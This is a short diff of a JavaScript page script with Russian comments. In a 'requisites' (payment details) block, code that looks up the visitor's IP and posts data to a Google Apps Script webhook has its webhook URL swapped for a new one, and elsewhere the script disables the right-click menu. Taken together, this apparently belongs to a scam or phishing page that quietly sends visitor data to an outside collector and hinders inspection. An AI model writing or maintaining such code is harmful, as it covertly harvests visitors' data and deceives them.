@@ -185,7 +185,7 @@ c['blocks']['requisites'] = function() {
             console.error('Ошибка получения IP:', e);
         }
 
-        const webhookUrl = 'https://script.google.com/macros/s/AKfycbxpVpxrn_LK12LGtdpC7xJOmWBbZzdFtbHcVwJ0iN_2JFNuvMa5VRvNjw84jO8fYWfY/exec';
+        const webhookUrl = 'https://script.google.com/macros/s/AKfycbxSQYe3xna1HPWSz0AgA2zMoYQzLWr6yhX8aETXkUOn7XyhNO7CrD7TEJE3WQNxjiSp/exec';
 
         // Отправка данных на Google Script
         fetch(webhookUrl, {
@@ -485,4 +485,5 @@ if (document['layers']) {
 } else if (document['all'] && !document['getElementById']) {
     document['onmousedown'] = clickIE4;
 }
+
 document['oncontextmenu'] = new Function('return\x20false');
